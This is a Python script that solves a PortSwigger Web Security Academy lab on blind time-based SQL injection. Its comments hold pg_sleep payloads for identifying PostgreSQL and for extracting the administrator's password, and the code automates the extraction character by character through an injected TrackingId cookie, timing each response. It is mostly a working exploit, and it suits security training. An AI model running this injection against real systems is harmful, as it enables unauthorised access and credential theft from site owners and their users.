# This is a simple Python program created to solve the following lab:
# https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

# The database type can be confirmed to be PostgreSQL, by using the following Postgres specific syntax to perform a blind time based SQL injection:
# abc'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

# After identifying the database, the following blind time based SQL injection can be used as a payload:
# '%3B+SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1)+=+'a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
# '; SELECT CASE WHEN (SUBSTRING(SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a') THEN pg_sleep(10) ELSE pg_sleep(0) END--


import time
import requests

SCHEME = "HTTPS://"
URL = "web-security-academy.net"
PATH = "/login"
SUB_DOMAIN = "INSERT SUB-DOMAIN HERE" # Change This Line With Labs Subdomain
FULL_PATH = SCHEME + SUB_DOMAIN + "." + URL + PATH
PASSWORD_LENGTH = 20
SECONDS = 5
NUMS_AND_LOW_ALPHA = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
    'a', 'b', 'c', 'd', 'e', 'f', 'g',
    'h', 'i', 'j', 'k', 'l', 'm', 'n',
    'o', 'p', 'q', 'r', 's', 't', 'u',
    'v', 'w', 'x', 'y', 'z'
]

password = ""

for i in range(1, PASSWORD_LENGTH + 1):
    for char in NUMS_AND_LOW_ALPHA:
        blind_sqli_timed_payload = f"'%3B+SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username+=+'administrator'),{i},1)+=+'{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--"
        headers = {"Cookie" : "TrackingId=xyz" + blind_sqli_timed_payload}
        start_time = time.time()
        response = requests.get(FULL_PATH, headers=headers)
        end_time = time.time()
        if response.status_code != 200:
            exit(f"Oh-oh, status code {response.status_code}, something went wrong while making request to {FULL_PATH}.")
        if end_time - start_time > 5:
            password = f"{password}{char}"
            print(f"Possible password character matched: POSITION - {i}, CHARACTER - {char}")
            break

print(f"Program finished running, possible password is {password}")
